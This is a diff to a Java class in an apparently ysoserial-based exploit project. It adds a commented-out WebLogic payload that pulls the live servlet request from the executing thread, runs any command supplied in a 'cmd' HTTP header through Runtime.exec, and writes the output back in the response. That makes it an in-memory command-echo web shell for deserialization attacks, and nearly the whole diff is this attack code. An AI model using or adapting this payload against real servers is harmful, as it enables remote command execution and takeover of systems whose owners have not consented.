@@ -14,6 +14,21 @@ public class Cqq {
 //        Class.forName("ysoserial.Cqq");
 
         test();
+
+
+//        weblogic.work.WorkAdapter adapter = ((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork();
+//        java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");
+//        field.setAccessible(true);
+//        Object obj = field.get(adapter);
+//        weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj);
+//        String cmd = req.getHeader("cmd");
+//        if(cmd != null && !cmd.isEmpty()){
+//            String result = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
+//            weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) obj.getClass().getMethod("getResponse").invoke(obj);
+//            res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));
+//            res.getServletOutputStream().flush();
+//            res.getWriter().write("");
+//        }
     }
 
     static{
